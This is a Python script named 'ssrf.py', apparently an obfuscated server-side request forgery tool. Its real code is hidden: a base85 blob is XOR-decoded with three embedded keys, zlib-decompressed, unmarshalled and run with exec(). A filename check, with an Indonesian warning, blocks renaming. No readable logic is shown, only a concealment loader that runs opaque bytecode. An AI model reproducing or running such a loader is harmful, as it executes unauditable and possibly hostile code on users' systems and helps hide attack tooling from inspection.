# Protected by SPECTRA
import base64, marshal, zlib, os, sys
_EXP = "ssrf.py"
if os.path.basename(__file__) != _EXP:
    print("[!] JANGAN RENAME FILE INI!")
    sys.exit(1)
_K1 = bytes.fromhex("499e1ef06b6a0e600f21a8ffd788d2c807209c570a338d506887c1121987f51c47003ba498987c2eb44e0c2c1fe5be5451bdc177d14d043e9993d181e3710452")
_K2 = bytes.fromhex("6b974e875f4d2020918ea1567725d57d40d54e3f9f2cc3099b9648d679ec080b21468bf6e8cdaca25a1f6fdcd381ed3994f6ac3b6519981faffa6b2843e5f8fc")
_K3 = bytes.fromhex("f9aea0668d2c9e139094e6b251cdd647f99216501cddcfb925acab1edcbde85c76bba8feb0eda91ecbbacdf94d18345beae3f27e1eb30cce311abbfa11b5861a")
_S = """qkUyb<Y%h{c!jLh{U7w8tj^nV9YiC|OfP4MD7EMhqENsdgyZXXw5bcZZIurWozBvuUMs*^-cK2eHk$|B
#>;ToWDaIh7-Q(h_DunhGYWM{I~z1(bUiks>lz^z=g4>P2hhvXI*~y6&I2xiY&4`*WZGvle9Us32-Ya{
V7Wr&N8u0hwy;4uXXx-pMnRA|S40_s1Qj^_^+Sp8M3;*CDYhm3sd9+KD`g)wWNx#e{4%PBR303AHTfAM
({lcP(~ZzNE+~HjIbyZ<3}zj<<3j6U%KdD5hIVi37Tpg#+Yo3vEJL@UgtTPhC48CIuZ@=l2N8iU@w__9
dxWr7-U9_y$SP~<CE7s!4?2mkgkG`q@emk-ep#26Pal^x;1S><SJ`dC3)KF@IN!|UhR1`vMM)qz=RwJx
W`VeQ?M)^DWb04PHPaYomXwcb+mLREFoaW=C|BN|y;X9`_@tK^D{qYXYIlHY)a_icJC{Bl7h0F-zUeh6
GpMKipV+d@QgXy`Bo35Dd5NkKANk7?Ueh<;Dr7a+yVR-sMn8f)qnI$`W=>o6x(VO!8x>%o3HGD>EGh45
I)h)EiKFEL>p=XcJLjU2!O3F$CPb969^c-exsO@HIjH(Sih!<f2+b<}>srjb{K(yf8sWGYkOx*6bMcSB
A>E=KIJER?%N*c#rTLup*f3^Lt*}XqSW!I?yuOp1vK%F^Zs+d+2ZJk2)N}w&Y7q+RfwaaKLy1@Y7!ARZ
en+d&))N`W{jbEI5M!j@Tir;ckBQ@w?~#NInD2;zC23!q)V=AHW|r2}xL5QYfNW)e&gVP&Viv4f|Fo}k
{P9&qf!qu%PrbcK*F<z#SjD-;7(+=Z#X#SW<uc=oV)-W*!kDY275gWhBuU)b+5JdW8+<Nbw@73{RJ9Mj
(Ya#B?60DKTsAlzqyzG}{f(}AqYIlra^(R|h@Dp=a?~(k>=h$$ZC)HNi2>A5v@`tuW$x_dB`Yz%TPKO~
Uu&<#Qj)=vmyx@wIq&b%*jeNZlH94s@|bfKxbkDqO!hLSu4b$^{H%OJN+lw;8a$_$Gv1zapaGq=YxEZ!
_qsA1baBV3*p)DVYTpx2Q+`pAwP+1aVC5v)k<30<MH~8PN$P~YsO6F+fk`)n62qoy)kSQ<-gCKMLJ^$~
zy)aVFPY4_2#hH_Lc+sVidF3qBTh!ZwJtcXkNw{~BoCg{hp}V!B7L_g{OT8{vhaV>Zag|83|R(hBz`Xd
4VqZ}6c=%`3eUD=5D2M-OdzWToxJ&#5vKbn`bdc|{&)2hrVb^c{zZ3WMwu$bN)et>?FkBhqW|37M?fuc
^5mvqHJAgpd6;>+6Q;pKei5bY#Cco&R9k>|?wOQEQzRb8+?aQAX(eT6VT?hgXM=tJipHl5XekEdxe{!A
19CvS-8v(;3u?)byLh}S9o&Wg$MNJC?Q|AJY`$o?Izt)%MQ+4H@GhQA4&(<DQRj<h2ZkTWjj_^;vO+(*
4-#DJ#_J6fZJh+%Hh;~H!h^l#V7c{PQ{<HfA1Sk~8~V1S|FDJuz?ykFa|HuT5)^W)bCJw7Gb}5qcafE-
d0ZCE8)TYBKu=KyVOISL*y<aG&$DH`QAZT64b$#peoeas;nR_l5yl1-tSVbicZ^?)Drcp?9Xz3T{K<^$
Sh$Rp#F-P77~N@tZ9Sh=Ylf81`NscQP~gi)tptU0L)Rwe6go?VzS6lex=I+ovU@jHP;t0~0V>ry^u-_5
{?FW(yrOau*)ygp8?Lc94@PLPOV2NSTuSF0VjN_riL3<`*Ue;Q;~Ajt`fIt5-zzrlk$>!@{E5saP~RoV
JxdHSJmDz>I*B;t46qLTV}RNo|E|1$562v}gdnWw@m){wfM>qU+~`iunnpG;+ql?)Zl;_>HkU;_t692=
Uln%ZE*ttt7!cV+)=om@?xjnqWWuf$m0wJl^`*dc-gj4H8xzO6-2Kd<oB&emqt#U?47x55#5H&yO3gNx
@4#pv<+nVi+p6Au{Sh*(BX?+|nI-~Q2Q=hUPbr(|ZEUt$zzQZ4sb#T~x@)^f)$I0<%&RbrI@>Y`!YS~Q
4R2!fWjnES=G1PEDx{1Nsse!_`W`)x@LgMKQtr{&X)9smd@PC%piWKw5t8=2Y7%!Re6u_zUn)YCw^xw6
0Uic@NhUbMwS%fK3s&8#&0@#HcEN%hq2F@J6Ms>o2_feWdny_U+gEqyQ`eptl1oXk7>pS%a9Fs~v0YZ7
C*45(0{aRbY_^{H(_`$Zm5L5(;oUa<Mk8jjB1(96bh_#KHk`69jDdkzCf~Ja?l7k6+&v*gxquN&>DC|h
Fq16H;czVBEse=lLe&<}>k3o>E7oc>y;gu6#T_)@y2DmaTy#$&i*A<U59cR=9>V*nasd%_x@&gxbb{{<
ZpT|d`o11et;vAiIc2{=cA||3OFO@d9;F82np*}K9|_8DV11t;5b=w_V+7k?#ixx(cMsM5_UTY@Ge7%m
Y`6vT`t6iQEq~tVJi{VF%n1_pkjzS8ZAyRvRQSN^|F~ibLgf2twFXqLuVbVcjLw&Lo`u!SHMY&1Z44aB
5O0MboYj7tsSgnKZEsdO>JNa2L+d7@!x%e8M-8>J_O<{{CQz%yxik{Rzm*&e-+5o1Etv&1iGY3qL0!aa
3hq3PK1dpIA^1L-uPydK_ZH$`qaWhbr9_;5t*Z~h>qF+F&q$iBR#x$L{Tme!1JC8FHfAZ^JAfq3daXR@
4ll63kIO(B*4+CY8swwI23hs5r|?RNPjn|8xR*g+wn2ZLN|4su1&M5h5ikHHV-aZX16hC^AxOlJ>##1R
#EV_Psra^^@_kxvoi<<uJ^khiI4km#z3iXOVTRjD=Q=!pYl!5C^m3h)++>I=#j}&-!f~Znt^n)KJ$Xi|
LNX#m<hZ&xg!#r<>z1~-E3;sbP|zd79`9sNZvWV4zO-l=)BLoYjm&+UOP3X`0|pg410V4|NG2oS;gaq8
hx_IZ4#&t7QXRr`MG%@68Y61YLy)_9wp}*&U~X@&n#0Qn9RvKuiYv?et9li#CZ1QHQ0@w#+M;dX(#@iP
?7nM=CfI!7ZA9K~n2Zf>!eiUQ<F_mebeGjQbI9o;L!GqsMQeso6&dA&=P>OC_gO@+@_URTU_oPfkiuCQ
w{dYOa?Mt<<_SuQV$oQ;rwF+DQz$^P5DWt$N%b?0L~Ln3QN;tvS++=NLuN)@IS?p#+8o&=ojOx%T|>9J
m*uKYuWpEVXU)n5pDly9YW$oN)^O8HNjls}73k1QF^oLK4n@eLsOWEOsd**n#B*-M$DV81`@Fn#F7|Wp
1vDGgKK0L{F(k6#to#n_<DC@8C_NT686d-dORC~Fu!@&*Y^x`#`4Xu9JS4eqP$y;Zcb)$eLfC#TL7!7=
0ag=$z9>K66(}^e(w7{I@tjJZ@(EI1HMCEo{#ko;vC1V4t#`c~P6?3sBh{Woc=I8@bB-H>vNkul&+vjr
9ZE*fLY)kh@yq!yDUqF?#6j|c7Fst##Y%7Am$aLery2wBFEz)Z-y1^u2R!DI@^<5rO+f!p_=U%cmgkpr
V$zGRp0{J5^lc#U%3XFv#3}oU=6v{tWm?v(b2QtU)rj*a78^!k+NXB;eBO-Fa#!ck^(d}hIR<^VX+Psh
hR=qoLitv&%*X*A!P4&s3x0ishAICFt74fuV<)J+aUG8>XL0rcT)bs+(vvI8>oaf;T#t1s&Z3@YUfI|y
A_Z?9hZapc`hJ+i3Z2ThAa3}YmmK?4Vr<r8T}jS;dgALhE#HgJV1mT@Nff!^l1qf`UTXh089Y5rYc2Ov
RB0BTmF$a9cf=lCo?UA~e+WK4df!IA<764Z<M*!c`Dh;%{Ua13LaZ@7>;_2*SQ%i`z@FuPM;=D4*=6_H
UcT}uWc*w#bb_zD3uGWbsNUnT9<M12{7f%K%nh6MQhCEyxyvF`Ed)_m|MYa06n@m6k%i?8q!lS`gIAh{
n?yopbpj<!fhk^H0;hJKewZFYg;jjbhQn~lF=K?(jN5vFCTCfR)l?sr2aeDHJbYn<3-Jf;4dhVntvoqI
q1{>%b8KA@UPU!ovE!a8($=c$F2jO$(zNcar&od?<U%;XIG6i|!TTWEEnqPE|7b)DM1cmNkr^FN1`V@5
QAE^)Uo#0^2_zv4G)!?dKvLKe=S)H|`LsTD7G$B{l_eanwWMCQ#38JxD0T$|=GiYTehY%FG|$4$U?MaE
O)Rku+jHBk=#<XiuX@?oPW9ptAG*kM0+G`Q@`bzPjXE*g!TH!t0w35&=1sUPoEjU=fUiwIi}@`(WfLYU
jpuUyA7Azz(S=NkVHSisCf8RK$lO(^Dgp;SV}du>mJzpo>X$kY_9s3Uq-D5cM)Avm*sZg?|4~GFA#3^I
RY9k;=febLCqDmM7pBg~D`<Ez;e-gk8w4yN1LyspTtRA!<?s-zt!%)KZRqo$ZBm*@ebNj=Td+t9qj!$@
a{gwcZpz0oT#^Y-h-${l_pU_>r`;jKkjHrGGs4I=T7#ol?=OqxbtzOV3DXX88x-GN#zdzP6h^-jP_|xO
>w8566$%TovGYk8^pDej7O_S#`lQ8~-K*|{tph{*aWj?#Ci--APg*bv@-oX|s1fCMpYe*{;4zipQRgO?
dHZ!Ybv~1sSyL`Y>cSKEk%1m5yo;6E=5_*b6E@ZtH(#EozI0?$udJWm1l0L-FWW-8z|Lfk=}YG+fHpYb
poV;?vE>w8eQK*JbRHdV`txH5346e#<EW(Si(1b0o<s?N+kK_G89#lI`u`_lXi2lPQ<Rjs8l?E3iyqrY
NTaqfANZ$R($7uRzH!NS*Q*;1Hb%m}E2zM<Q32soQAMZjcx;4cnzhyC=>"""
_B = base64.b85decode(_S.replace("\n", "").encode("ascii"))
_D1 = bytes(b ^ _K3[i % len(_K3)] for i, b in enumerate(_B))
_D2 = bytes(b ^ _K2[i % len(_K2)] for i, b in enumerate(_D1))
_D3 = bytes(b ^ _K1[i % len(_K1)] for i, b in enumerate(_D2))
_Z = zlib.decompress(_D3)
_C = marshal.loads(_Z)
exec(_C)
